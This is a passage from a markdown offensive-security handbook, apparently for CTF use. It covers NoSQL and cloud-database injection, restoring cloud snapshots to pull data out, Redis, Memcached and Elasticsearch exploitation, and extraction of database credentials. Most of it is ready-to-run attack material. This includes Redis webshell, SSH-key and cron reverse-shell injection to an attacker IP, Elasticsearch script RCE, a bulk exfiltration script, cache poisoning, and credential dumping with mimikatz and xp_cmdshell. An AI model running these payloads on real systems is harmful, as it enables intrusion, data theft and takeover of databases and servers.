+
+# Injection in ExpressionAttributeValues
+# Normal: {"uname": "alice", "pwd": "pass123"}
+# Inject: {"uname": "admin", "pwd": {"$ne": ""}}  # [Inference] May bypass authentication
+```
+
+**Attribute Name Injection**
+
+```bash
+# API request manipulation
+aws dynamodb query \
+  --table-name Users \
+  --key-condition-expression "user_id = :id" \
+  --expression-attribute-values '{":id": {"S": "admin"}}'
+
+# Injection attempt (check for error-based info disclosure)
+aws dynamodb query \
+  --table-name Users \
+  --key-condition-expression "user_id = :id OR 1=1" \
+  --expression-attribute-values '{":id": {"S": "admin"}}'
+```
+
+**Scanning for Data Extraction**
+
+```bash
+# Extract all table data (if permissions allow)
+aws dynamodb scan --table-name <table-name>
+
+# Paginated scan for large tables
+aws dynamodb scan --table-name <table-name> --max-items 100
+
+# Filter scan results
+aws dynamodb scan --table-name Users --filter-expression "admin = :admin_val" --expression-attribute-values '{":admin_val": {"BOOL": true}}'
+```
+
+**Tool: NoSQLMap (DynamoDB Support)**
+
+[Unverified] NoSQLMap's DynamoDB support is limited compared to MongoDB. Manual testing is more effective.
+
+```bash
+# Basic usage (limited effectiveness)
+git clone https://github.com/codingo/NoSQLMap.git
+python nosqlmap.py --target <url> --attack 1
+```
+
+### MongoDB Injection (Common in Cloud Environments)
+
+**Authentication Bypass**
+
+```javascript
+// Vulnerable query
+db.users.find({username: username, password: password})
+
+// Injection payloads
+username[$ne]=null&password[$ne]=null
+username=admin&password[$regex]=.*
+username=admin&password[$gt]=
+```
+
+**Command Injection via $where**
+
+```javascript
+// Payload injecting JavaScript
+username=admin&password=1'; return true; var dummy='
+
+// Full query becomes
+db.users.find({$where: "this.username=='admin' && this.password=='1'; return true; var dummy=''"})
+```
+
+**Tool: NoSQLMap (MongoDB)**
+
+```bash
+python nosqlmap.py --target http://target.com/login --attack 1 --verb POST --data "username=admin&password=test"
+
+# Test for specific injection types
+python nosqlmap.py --target <url> --attack 2  # JavaScript injection
+python nosqlmap.py --target <url> --attack 3  # Timing-based
+```
+
+### Azure CosmosDB Injection
+
+**SQL API Injection**
+
+CosmosDB's SQL API uses a SQL-like query syntax:
+
+```sql
+-- Normal query
+SELECT * FROM c WHERE c.username = 'admin' AND c.password = 'pass123'
+
+-- Injection attempts
+' OR 1=1--
+' UNION SELECT * FROM c--
+admin' AND '1'='1
+```
+
+**REST API Manipulation**
+
+```bash
+# Query documents via REST API
+curl -X POST \
+  https://<account>.documents.azure.com/dbs/<db>/colls/<coll>/docs \
+  -H "Authorization: type=master&ver=1.0&sig=<sig>" \
+  -H "x-ms-documentdb-isquery: True" \
+  -d '{"query": "SELECT * FROM c WHERE c.id=\"admin\"", "parameters": []}'
+
+# Injection in query string
+{"query": "SELECT * FROM c WHERE c.id=\"admin\" OR 1=1--\"", "parameters": []}
+```
+
+**Partition Key Enumeration**
+
+```bash
+# List collections and partition keys
+az cosmosdb sql container show \
+  --account-name <account> \
+  --database-name <db> \
+  --name <collection> \
+  --query "partitionKey"
+```
+
+**Tool: Burp Suite Extensions**
+
+```
+Extensions -> BApp Store -> Install "NoSQL Injection"
+Intercept requests -> Right-click -> "Scan for NoSQL injection"
+```
+
+---
+
+## Database Backup Enumeration
+
+### AWS RDS Snapshots
+
+**Manual Snapshot Discovery**
+
+```bash
+# List all RDS snapshots (automated and manual)
+aws rds describe-db-snapshots
+
+# List only public snapshots
+aws rds describe-db-snapshots --include-public
+
+# Filter by specific instance
+aws rds describe-db-snapshots --db-instance-identifier <instance-name>
+
+# Check snapshot permissions (public exposure)
+aws rds describe-db-snapshot-attributes --db-snapshot-identifier <snapshot-id>
+```
+
+**Automated Snapshot Enumeration**
+
+```bash
+# List snapshots with creation time
+aws rds describe-db-snapshots --query 'DBSnapshots[*].[DBSnapshotIdentifier,SnapshotCreateTime,Encrypted]' --output table
+
+# Find unencrypted snapshots
+aws rds describe-db-snapshots --query 'DBSnapshots[?Encrypted==`false`].[DBSnapshotIdentifier,DBInstanceIdentifier]'
+```
+
+**Cross-Account Snapshot Sharing Detection**
+
+```bash
+# Check if snapshot is shared with other accounts
+aws rds describe-db-snapshot-attributes --db-snapshot-identifier <snapshot-id> --query 'DBSnapshotAttributesResult.DBSnapshotAttributes[?AttributeName==`restore`].AttributeValues'
+
+# List snapshots shared with your account
+aws rds describe-db-snapshots --include-shared --query 'DBSnapshots[*].[DBSnapshotIdentifier,DBInstanceIdentifier]'
+```
+
+**Tool: Prowler (Automated Security Checks)**
+
+```bash
+# Install Prowler
+git clone https://github.com/prowler-cloud/prowler
+cd prowler
+
+# Check for public RDS snapshots
+./prowler aws --service rds --check rds_snapshots_public_access
+
+# Check for unencrypted snapshots
+./prowler aws --service rds --check rds_snapshots_encrypted
+```
+
+### S3 Backup Discovery
+
+**Common Backup Naming Patterns**
+
+```bash
+# Search for backup-related buckets
+aws s3 ls | grep -E '(backup|dump|snapshot|export|archive)'
+
+# Check specific patterns
+aws s3 ls s3://<company>-db-backup
+aws s3 ls s3://<company>-rds-snapshots
+aws s3 ls s3://prod-db-backup-<region>
+```
+
+**Automated S3 Bucket Enumeration**
+
+```bash
+# Using S3Scanner
+git clone https://github.com/sa7mon/S3Scanner.git
+python3 s3scanner.py --bucket-file bucket_list.txt
+
+# Using Cloud_enum
+git clone https://github.com/initstring/cloud_enum.git
+python3 cloud_enum.py -k <company-name>
+```
+
+**SQL Dump File Discovery**
+
+```bash
+# List and search for dump files
+aws s3 ls s3://<bucket>/ --recursive | grep -E '\.(sql|dump|bak|backup)$'
+
+# Download database dump
+aws s3 cp s3://<bucket>/database.sql.gz .
+gunzip database.sql.gz
+```
+
+### Azure Backup Enumeration
+
+**List Backup Vaults**
+
+```bash
+# List Recovery Services vaults
+az backup vault list
+
+# List backup items in vault
+az backup item list --resource-group <rg> --vault-name <vault>
+
+# List SQL database backups
+az backup recoverypoint list \
+  --resource-group <rg> \
+  --vault-name <vault> \
+  --container-name <container> \
+  --item-name <item>
+```
+
+**Storage Account Backup Discovery**
+
+```bash
+# List storage accounts
+az storage account list
+
+# Check for backup containers
+az storage container list --account-name <account>
+
+# Look for backup blobs
+az storage blob list --container-name backup --account-name <account>
+```
+
+### Google Cloud Backup Enumeration
+
+**Cloud SQL Backups**
+
+```bash
+# List backups for an instance
+gcloud sql backups list --instance=<instance-name>
+
+# Describe specific backup
+gcloud sql backups describe <backup-id> --instance=<instance-name>
+```
+
+**GCS Backup Discovery**
+
+```bash
+# List buckets
+gcloud storage buckets list
+
+# Search for backup patterns
+gcloud storage ls gs://*backup*
+gcloud storage ls gs://*dump*
+
+# List objects in backup bucket
+gcloud storage ls gs://<bucket-name>/**
+```
+
+---
+
+## Snapshot Exploitation
+
+### Restoring RDS Snapshots
+
+**Create New Instance from Snapshot**
+
+```bash
+# Restore snapshot to new RDS instance
+aws rds restore-db-instance-from-db-snapshot \
+  --db-instance-identifier exploited-db \
+  --db-snapshot-identifier <snapshot-id> \
+  --publicly-accessible
+
+# Modify security group to allow access
+aws rds modify-db-instance \
+  --db-instance-identifier exploited-db \
+  --vpc-security-group-ids <sg-id> \
+  --apply-immediately
+
+# Wait for instance to become available
+aws rds wait db-instance-available --db-instance-identifier exploited-db
+```
+
+**Modifying Restored Instance for Access**
+
+```bash
+# Create permissive security group
+aws ec2 create-security-group \
+  --group-name exploit-sg \
+  --description "Temporary access" \
+  --vpc-id <vpc-id>
+
+# Allow inbound from your IP
+aws ec2 authorize-security-group-ingress \
+  --group-id <sg-id> \
+  --protocol tcp \
+  --port 3306 \
+  --cidr <your-ip>/32
+
+# Apply to restored instance
+aws rds modify-db-instance \
+  --db-instance-identifier exploited-db \
+  --vpc-security-group-ids <sg-id> \
+  --apply-immediately
+```
+
+**Extracting Data**
+
+```bash
+# Connect to restored instance
+mysql -h <restored-endpoint> -u <username> -p
+
+# Enumerate databases
+SHOW DATABASES;
+
+# Dump all data
+mysqldump -h <restored-endpoint> -u <username> -p --all-databases > stolen_data.sql
+
+# Target specific tables
+mysqldump -h <restored-endpoint> -u <username> -p <database> users > users.sql
+```
+
+### EBS Snapshot Exploitation
+
+**Public EBS Snapshot Discovery**
+
+```bash
+# Search for public snapshots (requires snapshot ID hints)
+aws ec2 describe-snapshots --owner-ids self --restorable-by-user-ids all
+
+# Check specific snapshot permissions
+aws ec2 describe-snapshot-attribute --snapshot-id <snap-id> --attribute createVolumePermission
+```
+
+**Mounting EBS Volumes from Snapshots**
+
+```bash
+# Create volume from snapshot
+aws ec2 create-volume \
+  --snapshot-id <snap-id> \
+  --availability-zone <az> \
+  --volume-type gp2
+
+# Launch EC2 instance in same AZ
+aws ec2 run-instances \
+  --image-id <ami-id> \
+  --instance-type t2.micro \
+  --key-name <key-pair> \
+  --subnet-id <subnet-id>
+
+# Attach volume to instance
+aws ec2 attach-volume \
+  --volume-id <vol-id> \
+  --instance-id <instance-id> \
+  --device /dev/sdf
+
+# SSH to instance and mount
+ssh -i key.pem ec2-user@<instance-ip>
+sudo lsblk  # Identify device
+sudo mkdir /mnt/exploit
+sudo mount /dev/xvdf1 /mnt/exploit
+```
+
+**Extracting Sensitive Data from Mounted Volume**
+
+```bash
+# Search for database files
+find /mnt/exploit -name "*.db" -o -name "*.sql" -o -name "*.mdb"
+
+# Look for configuration files
+grep -r "password" /mnt/exploit/etc/
+grep -r "connection" /mnt/exploit/var/www/
+
+# Extract MySQL data directory
+cp -r /mnt/exploit/var/lib/mysql/ /tmp/stolen/
+
+# Parse MySQL data files (if innodb)
+# Use mysqlfrm or similar tools on .ibd files
+```
+
+### Azure Disk Snapshot Exploitation
+
+**Create Disk from Snapshot**
+
+```bash
+# List snapshots
+az snapshot list
+
+# Create managed disk from snapshot
+az disk create \
+  --resource-group <rg> \
+  --name exploited-disk \
+  --source <snapshot-id>
+
+# Attach to VM
+az vm disk attach \
+  --resource-group <rg> \
+  --vm-name <vm-name> \
+  --name exploited-disk
+```
+
+**Mounting and Analysis**
+
+```bash
+# SSH to VM
+ssh azureuser@<vm-ip>
+
+# Identify new disk
+lsblk
+
+# Mount disk
+sudo mkdir /mnt/exploit
+sudo mount /dev/sdc1 /mnt/exploit
+
+# Search for sensitive data
+find /mnt/exploit -type f -name "*.config"
+find /mnt/exploit -type f -name "web.config" -exec grep -H "connectionString" {} \;
+```
+
+### Google Cloud Disk Snapshot Exploitation
+
+**Create Disk from Snapshot**
+
+```bash
+# List snapshots
+gcloud compute snapshots list
+
+# Create disk from snapshot
+gcloud compute disks create exploited-disk \
+  --source-snapshot=<snapshot-name> \
+  --zone=<zone>
+
+# Attach to instance
+gcloud compute instances attach-disk <instance-name> \
+  --disk=exploited-disk \
+  --zone=<zone>
+```
+
+**Data Extraction**
+
+```bash
+# SSH to instance
+gcloud compute ssh <instance-name> --zone=<zone>
+
+# Mount and analyze (same as EBS process)
+sudo mkdir /mnt/exploit
+sudo mount /dev/sdb1 /mnt/exploit
+```
+
+### Automated Snapshot Exploitation Tools
+
+**Tool: Pacu (AWS Exploitation Framework)**
+
+```bash
+# Install Pacu
+git clone https://github.com/RhinoSecurityLabs/pacu.git
+cd pacu && bash install.sh
+
+# Run RDS snapshot enumeration module
+run rds__explore_snapshots
+
+# Restore snapshot module [Unverified - manual module creation may be needed]
+# Manual restoration via AWS CLI is more reliable
+```
+
+**Tool: cloud_enum (Discovery)**
+
+```bash
+git clone https://github.com/initstring/cloud_enum.git
+python3 cloud_enum.py -k <company> -k <product> --quickscan
+```
+
+---
+
+## Important Security Considerations
+
+**Encryption Status Verification**
+
+Always check if snapshots/backups are encrypted:
+
+```bash
+# AWS
+aws rds describe-db-snapshots --query 'DBSnapshots[*].[DBSnapshotIdentifier,Encrypted]'
+
+# Azure
+az sql db show --resource-group <rg> --server <server> --name <db> --query "transparentDataEncryption"
+```
+
+**Credential Extraction from Backups**
+
+Common locations for credentials in database backups:
+
+- Application user tables (hashed passwords)
+- Configuration tables (connection strings)
+- Audit/log tables (may contain plaintext passwords from failed logins)
+- MySQL `mysql.user` table (password hashes)
+- PostgreSQL `pg_authid` table
+
+**Tool: truffleHog (Secret Scanning)**
+
+```bash
+# Scan SQL dump for secrets
+trufflehog filesystem /path/to/database.sql --json
+
+# Scan mounted volume
+trufflehog filesystem /mnt/exploit/
+```
+
+---
+
+**Related Topics to Explore**
+
+- **Serverless Database Security**: Aurora Serverless, DynamoDB Streams exploitation
+- **Database Activity Monitoring Bypass**: Techniques for evading CloudWatch/Azure Monitor alerts
+- **Cross-Account IAM Exploitation**: Assuming roles to access shared snapshots
+
+---
+
+## Redis Exposure
+
+### Understanding Redis Security Model
+
+Redis is an in-memory data structure store operating on TCP port 6379 (default). In CTF environments, Redis instances are frequently exposed without authentication or with weak configurations, providing direct access to sensitive data and potential remote code execution.
+
+### Reconnaissance & Enumeration
+
+**Port Discovery:**
+
+```bash
+nmap -p 6379 -sV --script redis-info <target>
+```
+
+**Manual Connection Testing:**
+
+```bash
+redis-cli -h <target_ip> -p 6379
+nc <target_ip> 6379
+telnet <target_ip> 6379
+```
+
+**Authentication Check:**
+
+```bash
+redis-cli -h <target_ip> ping
+# Response "PONG" = no auth required
+# Response "NOAUTH Authentication required" = auth needed
+```
+
+### Information Gathering
+
+**Server Information:**
+
+```bash
+INFO
+INFO server
+INFO keyspace
+INFO replication
+```
+
+**Configuration Extraction:**
+
+```bash
+CONFIG GET *
+CONFIG GET dir
+CONFIG GET dbfilename
+CONFIG GET requirepass
+```
+
+**Key Enumeration:**
+
+```bash
+KEYS *
+SCAN 0 COUNT 1000
+DBSIZE
+```
+
+**Data Extraction:**
+
+```bash
+GET <keyname>
+HGETALL <keyname>
+SMEMBERS <keyname>
+LRANGE <keyname> 0 -1
+```
+
+### Exploitation Techniques
+
+**Webshell Upload via RDB File (Linux):**
+
+```bash
+# Set working directory to web root
+CONFIG SET dir /var/www/html
+CONFIG SET dbfilename shell.php
+SET webshell "<?php system($_GET['cmd']); ?>"
+SAVE
+# Access: http://target/shell.php?cmd=id
+```
+
+**SSH Key Injection (Linux):**
+
+```bash
+# Generate SSH key pair
+ssh-keygen -t rsa -f redis_key
+
+# Prepare key with padding
+(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > key.txt
+
+# Inject into Redis
+cat key.txt | redis-cli -h <target> -x set ssh_key
+CONFIG SET dir /root/.ssh
+CONFIG SET dbfilename authorized_keys
+SAVE
+
+# Connect
+ssh -i redis_key root@<target>
+```
+
+**Cron Job Injection (Linux):**
+
+```bash
+CONFIG SET dir /var/spool/cron/crontabs
+CONFIG SET dbfilename root
+SET cron_job "\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'\n\n"
+SAVE
+```
+
+**Module Loading for RCE (Redis ≥4.0):**
+
+```bash
+# Using redis-rogue-server
+python3 redis-rogue-server.py --rhost <target> --lhost <attacker_ip>
+
+# Manual module loading
+MODULE LOAD /path/to/malicious.so
+```
+
+### Tools
+
+**redis-cli:** Built-in client
+
+```bash
+redis-cli -h <target> -p 6379 -a <password> --raw
+```
+
+**redis-rogue-server:** Automated exploitation
+
+```bash
+git clone https://github.com/n0b0dyCN/redis-rogue-server
+python3 redis-rogue-server.py --rhost <target> --lhost <attacker_ip> --rport 6379 --lport 21000
+```
+
+**Metasploit Module:**
+
+```bash
+use auxiliary/scanner/redis/redis_server
+use exploit/linux/redis/redis_unauth_exec
+```
+
+---
+
+## Memcached Exposure
+
+### Understanding Memcached
+
+Memcached operates as a distributed memory caching system on UDP port 11211 (default) or TCP port 11211. Unlike Redis, it lacks built-in authentication in many versions and is designed for trusted network environments.
+
+### Reconnaissance
+
+**Service Detection:**
+
+```bash
+nmap -p 11211 -sV -sU --script memcached-info <target>
+nmap -p 11211 -sV -sT <target>
+```
+
+**Direct Connection:**
+
+```bash
+nc <target> 11211
+telnet <target> 11211
+```
+
+### Enumeration Commands
+
+**Statistics Gathering:**
+
+```bash
+stats
+stats items
+stats slabs
+stats cachedump <slab_id> <limit>
+```
+
+**Version Detection:**
+
+```bash
+version
+```
+
+**Key Dumping:**
+
+```bash
+# List all slabs
+stats items
+
+# For each slab, dump keys
+stats cachedump <slab_id> 0
+
+# Example:
+stats cachedump 1 0
+stats cachedump 2 0
+```
+
+**Data Retrieval:**
+
+```bash
+get <keyname>
+```
+
+### Exploitation Techniques
+
+**Automated Key Extraction:**
+
+```bash
+# Using memcached-cli
+pip install python-memcached
+python -c "import memcache; mc = memcache.Client(['<target>:11211']); print(mc.get_stats())"
+```
+
+**Mass Key Dumping Script:**
+
+```bash
+#!/bin/bash
+echo "stats items" | nc <target> 11211 | grep "STAT items" | awk '{print $2}' | cut -d: -f1 | sort -u | while read slab; do
+    echo "stats cachedump $slab 0" | nc <target> 11211
+done
+```
+
+**Data Poisoning (Cache Poisoning):**
+
+```bash
+# Set malicious value
+set <keyname> 0 0 <length>
+<malicious_data>
+
+# Example: Session hijacking
+set session:12345 0 0 50
+{"user":"admin","role":"administrator","authenticated":true}
+```
+
+**Amplification Attack Vector (DDoS):** [Unverified application in CTF context - this is primarily a network security concern]
+
+```bash
+# Stats command generates large response
+echo -e "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u <target> 11211
+```
+
+### Tools
+
+**libmemcached-tools:**
+
+```bash
+apt install libmemcached-tools
+memcstat --servers=<target>:11211
+memcdump --servers=<target>:11211
+memccat --servers=<target>:11211 <keyname>
+```
+
+**memcached-tool:**
+
+```bash
+memcached-tool <target>:11211 dump
+```
+
+**Metasploit:**
+
+```bash
+use auxiliary/gather/memcached_extractor
+use auxiliary/scanner/memcached/memcached_amp
+```
+
+---
+
+## Elasticsearch Misconfiguration
+
+### Understanding Elasticsearch Security
+
+Elasticsearch is a distributed search and analytics engine typically running on TCP port 9200 (HTTP API) and 9300 (transport protocol). Common misconfigurations include disabled authentication, exposed management APIs, and unrestricted network access.
+
+### Reconnaissance
+
+**Service Detection:**
+
+```bash
+nmap -p 9200,9300 -sV --script elastic-* <target>
+curl http://<target>:9200
+curl http://<target>:9200/_cluster/health?pretty
+```
+
+**Version Identification:**
+
+```bash
+curl http://<target>:9200/
+curl -X GET "http://<target>:9200/_nodes?pretty"
+```
+
+### Enumeration
+
+**Cluster Information:**
+
+```bash
+curl http://<target>:9200/_cluster/health?pretty
+curl http://<target>:9200/_cluster/stats?pretty
+curl http://<target>:9200/_cluster/state?pretty
+curl http://<target>:9200/_nodes?pretty
+```
+
+**Index Enumeration:**
+
+```bash
+curl http://<target>:9200/_cat/indices?v
+curl http://<target>:9200/_aliases?pretty
+curl http://<target>:9200/_mapping?pretty
+```
+
+**Data Extraction:**
+
+```bash
+# List all documents in index
+curl http://<target>:9200/<index_name>/_search?pretty
+
+# Retrieve all documents (limited by max_result_window, default 10000)
+curl http://<target>:9200/<index_name>/_search?pretty&size=10000
+
+# Scroll API for large datasets
+curl -X GET "http://<target>:9200/<index_name>/_search?scroll=1m&size=1000&pretty"
+
+# Retrieve specific document
+curl http://<target>:9200/<index_name>/_doc/<document_id>?pretty
+```
+
+**Search Query Examples:**
+
+```bash
+# Match all
+curl -X GET "http://<target>:9200/<index_name>/_search?pretty" -H 'Content-Type: application/json' -d'
+{
+  "query": { "match_all": {} }
+}'
+
+# Search for specific term
+curl -X GET "http://<target>:9200/<index_name>/_search?pretty" -H 'Content-Type: application/json' -d'
+{
+  "query": { "match": { "field_name": "password" } }
+}'
+
+# Wildcard search
+curl -X GET "http://<target>:9200/_search?pretty&q=*password*"
+```
+
+### Exploitation Techniques
+
+**Directory Traversal (CVE-2015-3337, Elasticsearch <1.4.5, <1.5.2):** [Unverified - verify version compatibility]
+
+```bash
+curl http://<target>:9200/_plugin/../../../../etc/passwd
+```
+
+**Remote Code Execution via Groovy Scripting (Elasticsearch <1.4.3):** [Unverified - verify version compatibility]
+
+```bash
+curl -X POST "http://<target>:9200/_search?pretty" -H 'Content-Type: application/json' -d'
+{
+  "size": 1,
+  "script_fields": {
+    "rce": {
+      "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"
+    }
+  }
+}'
+```
+
+**Script Execution via Painless (Modern Elasticsearch):** [Inference - depends on script.allowed_types configuration]
+
+```bash
+curl -X POST "http://<target>:9200/_search?pretty" -H 'Content-Type: application/json' -d'
+{
+  "script_fields": {
+    "test": {
+      "script": {
+        "lang": "painless",
+        "source": "Runtime.getRuntime().exec(\"whoami\")"
+      }
+    }
+  }
+}'
+```
+
+**Arbitrary File Read via Snapshot Repository:**
+
+```bash
+# Create repository pointing to sensitive location
+curl -X PUT "http://<target>:9200/_snapshot/test_repo?pretty" -H 'Content-Type: application/json' -d'
+{
+  "type": "fs",
+  "settings": {
+    "location": "/etc"
+  }
+}'
+
+# Create snapshot
+curl -X PUT "http://<target>:9200/_snapshot/test_repo/snapshot_1?wait_for_completion=true&pretty"
+
+# Retrieve snapshot (files may be encoded/compressed)
+curl "http://<target>:9200/_snapshot/test_repo/snapshot_1/_status?pretty"
+```
+
+**Data Exfiltration Automation:**
+
+```bash
+# Python script example
+#!/usr/bin/env python3
+import requests
+import json
+
+target = "http://<target>:9200"
+indices = requests.get(f"{target}/_cat/indices?format=json").json()
+
+for index in indices:
+    index_name = index['index']
+    print(f"[+] Extracting: {index_name}")
+    
+    response = requests.post(
+        f"{target}/{index_name}/_search?scroll=1m",
+        json={"size": 1000, "query": {"match_all": {}}},
+        headers={"Content-Type": "application/json"}
+    )
+    
+    data = response.json()
+    scroll_id = data.get('_scroll_id')
+    
+    with open(f"{index_name}.json", "w") as f:
+        json.dump(data['hits']['hits'], f, indent=2)
+```
+
+### Tools
+
+**elasticdump:** Data extraction utility
+
+```bash
+npm install -g elasticdump
+elasticdump --input=http://<target>:9200/<index> --output=<output_file>.json --type=data
+```
+
+**Metasploit:**
+
+```bash
+use auxiliary/scanner/elasticsearch/indices_enum
+```
+
+**elasticsearch-crawler:**
+
+```bash
+git clone https://github.com/AmIJesse/Elasticsearch-Crawler
+python elasticsearch-crawler.py http://<target>:9200
+```
+
+---
+
+## Database Credential Extraction
+
+### Overview
+
+Database credential extraction involves locating and retrieving authentication credentials from configuration files, environment variables, application code, memory dumps, and database-specific storage locations across various database management systems.
+
+### Common Credential Locations by Platform
+
+**Linux Systems:**
+
+- `/etc/mysql/my.cnf` (MySQL/MariaDB)
+- `/etc/postgresql/<version>/main/pg_hba.conf` (PostgreSQL)
+- `/var/www/html/config.php` (Web applications)
+- `/opt/<application>/conf/` (Application configs)
+- `~/.my.cnf` (User-specific MySQL configs)
+- Environment variables: `/proc/<pid>/environ`
+
+**Windows Systems:**
+
+- `C:\Program Files\MySQL\MySQL Server <version>\my.ini`
+- `C:\xampp\mysql\bin\my.ini`
+- `C:\inetpub\wwwroot\web.config`
+- Registry: `HKLM\SOFTWARE\MySQL AB\`
+- `C:\Users\<user>\AppData\Roaming\` (Application data)
+
+### MySQL/MariaDB
+
+**Configuration File Analysis:**
+
+```bash
+cat /etc/mysql/my.cnf | grep -i password
+cat /etc/mysql/debian.cnf  # Debian maintenance account
+find / -name "my.cnf" 2>/dev/null
+```
+
+**Password Extraction from mysql.user Table (Requires Access):**
+
+```bash
+mysql -u root -p
+use mysql;
+SELECT user, host, authentication_string FROM user;
+SELECT user, host, password FROM user;  # Older versions
+```
+
+**Hash Cracking:**
+
+```bash
+# MySQL 5.x/8.x hash format
+hashcat -m 300 hash.txt wordlist.txt
+
+# Old MySQL <=4.1
+hashcat -m 200 hash.txt wordlist.txt
+```
+
+**Extracting from mysqldump Files:**
+
+```bash
+grep -i "password" dump.sql
+grep "CREATE USER" dump.sql
+```
+
+**Memory Dump Analysis (Requires Root):**
+
+```bash
+strings /proc/<mysql_pid>/mem | grep -i password
+gdb -p <mysql_pid>
+(gdb) dump memory mysql_mem.dump 0x00000000 0x7fffffff
+strings mysql_mem.dump | grep -E "(password|pass=|pwd=)"
+```
+
+### PostgreSQL
+
+**Configuration Files:**
+
+```bash
+cat /etc/postgresql/*/main/pg_hba.conf
+cat /var/lib/pgsql/data/pg_hba.conf
+find / -name "pg_hba.conf" 2>/dev/null
+```
+
+**Password Extraction (Requires Access):**
+
+```bash
+psql -U postgres
+SELECT usename, passwd FROM pg_shadow;
+SELECT rolname, rolpassword FROM pg_authid;
+```
+
+**Environment Variables:**
+
+```bash
+# PostgreSQL often uses environment variables
+env | grep -i pg
+cat /proc/<pid>/environ | tr '\0' '\n' | grep -i pg
+```
+
+**Hash Cracking:**
+
+```bash
+# PostgreSQL MD5 format: md5<hash><username>
+hashcat -m 12 hash.txt wordlist.txt
+```
+
+### MSSQL (Microsoft SQL Server)
+
+**Windows Authentication Tokens:**
+
+```bash
+# Extract from memory (Windows)
+mimikatz # sekurlsa::logonpasswords
+
+# Registry keys
+reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s
+```
+
+**Configuration Files:**
+
+```cmd
+type "C:\Program Files\Microsoft SQL Server\MSSQL*\MSSQL\Binn\*.cfg"
+findstr /si password *.xml *.ini *.config *.cfg
+```
+
+**Credential Extraction via xp_cmdshell (Requires Access):**
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config';
+```
+
+**Linked Server Passwords (Stored in Master Database):**
+
+```sql
+SELECT * FROM master.sys.servers;
+SELECT * FROM sys.linked_logins;
+```
+
+### MongoDB
+
+**Configuration File:**
+
+```bash
+cat /etc/mongod.conf | grep -A 10 security
+```
+
+**Password Extraction (Requires Access):**
+
+```bash
+mongo
+use admin
+db.system.users.find()
+db.system.users.find().pretty()
+```
+
+**Credential Spray:**
+
+```bash
+# Common default credentials
+mongo -u admin -p admin
+mongo -u root -p root
+```
+
+### Oracle Database
+
+**Configuration Files:**
+
+```bash
+cat $ORACLE_HOME/network/admin/tnsnames.ora
+cat $ORACLE_HOME/network/admin/sqlnet.ora
+```
+
+**Password Hash Extraction (Requires DBA Access):**
+
+```sql
+SELECT name, password, spare4 FROM sys.user$;
+SELECT username, password FROM dba_users;
+```
+
+**Hash Cracking:**
+
+```bash
+# Oracle 10g
+hashcat -m 3100 hash.txt wordlist.txt
+
+# Oracle 11g/12c
+hashcat -m 112 hash.txt wordlist.txt
+```
+
+### Application Configuration Files
+
+**Common Patterns to Search:**
+
+```bash
+# Recursive search for credentials
+grep -ri "password" /var/www/ 2>/dev/null
+grep -ri "db_pass" /var/www/ 2>/dev/null
+grep -ri "connectionstring" /var/www/ 2>/dev/null
+
+# PHP applications
+find / -name "config.php" -exec grep -H "password" {} \; 2>/dev/null
+
+# Python applications
+find / -name "settings.py" -exec grep -H "PASSWORD" {} \; 2>/dev/null
+
+# Java applications
+find / -name "application.properties" -exec grep -H "password" {} \; 2>/dev/null
+unzip -p application.jar application.properties | grep password
+
+# .NET applications
+find / -name "web.config" -exec grep -H "connectionString" {} \; 2>/dev/null
+```
+
+**WordPress:**
+
+```bash
+cat /var/www/html/wp-config.php | grep DB_
+```
+
+**Drupal:**
+
+```bash
+cat /var/www/html/sites/default/settings.php | grep databases
+```
+
+**Joomla:**
+
+```bash
+cat /var/www/html/configuration.php | grep password
+```
+
+### Environment Variables & Processes
+
+**Process Inspection:**
+
+```bash
+# View environment of running processes
+ps auxe | grep -i password
+ps auxe | grep -i db_
+
+# Read process environment directly
+cat /proc/<pid>/environ | tr '\0' '\n'
+strings /proc/<pid>/cmdline
+```
+
+**Docker Environment:**
+
+```bash
+docker inspect <container_id> | grep -i password
+docker exec <container_id> env | grep -i pass
+```
+
+**System-wide Environment:**
+
+```bash
+env | grep -i pass
+printenv | grep -i db
+cat /etc/environment
+```
+
+### Network Traffic Analysis
+
+**Capturing Database Authentication:**
+
+```bash
+# MySQL (default port 3306)
+tcpdump -i any -s 0 -w mysql.pcap port 3306
+
+# PostgreSQL (default port 5432)
+tcpdump -i any -s 0 -w postgres.pcap port 5432
+
+# Analyze with Wireshark or tshark
+tshark -r mysql.pcap -Y "mysql.query" -T fields -e mysql.query
+```
+
+### Tools
+
+**linPEAS/WinPEAS:** Automated enumeration
+
+```bash
+./linpeas.sh | grep -i password
+./linpeas.sh | grep -i database
+```
+
+**LaZagne:** Multi-platform credential extractor
+
+```bash
+laZagne.exe all
+python laZagne.py all
+```
+
+**grep-based Scanner:**
+
+```bash
+#!/bin/bash
+# Comprehensive credential search
+find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" -o -name "*.xml" -o -name "*.php" -o -name "*.py" \) -exec grep -l -i "password\|passwd\|pwd\|connectionstring" {} \; 2>/dev/null
+```
+
+**SQLMap with --passwords:**
+
+```bash
+sqlmap -u "http://<target>/page.php?id=1" --passwords
+```
+
+### Post-Extraction Validation
+
+**Credential Testing:**
+
+```bash
+# MySQL
+mysql -h <target> -u <username> -p<password> -e "SELECT VERSION();"
+
+# PostgreSQL  
+psql -h <target> -U <username> -d <database> -c "SELECT version();"
+
+# MSSQL (using impacket)
+mssqlclient.py <username>:<password>@<target> -windows-auth
+
+# MongoDB
+mongo <target>/<database> -u <username> -p <password>
+```
+
+---
+
+## Important Related Topics
+
+For comprehensive database exploitation knowledge, consider studying these interconnected areas:
+
+- **SQL Injection** (SQLi fundamentals, blind SQLi, time-based exploitation, out-of-band techniques)
+- **NoSQL Injection** (MongoDB, CouchDB, Cassandra operator injection)
+- **LDAP Injection** (Directory service exploitation)
+- **Authentication Bypass Techniques** (Default credentials, weak hashing, session manipulation)
+- **Privilege Escalation via Database Access** (UDF exploitation, stored procedures, file system access)
+
+---
+
+# CI/CD Pipeline Security
+
+## Pipeline Enumeration
+
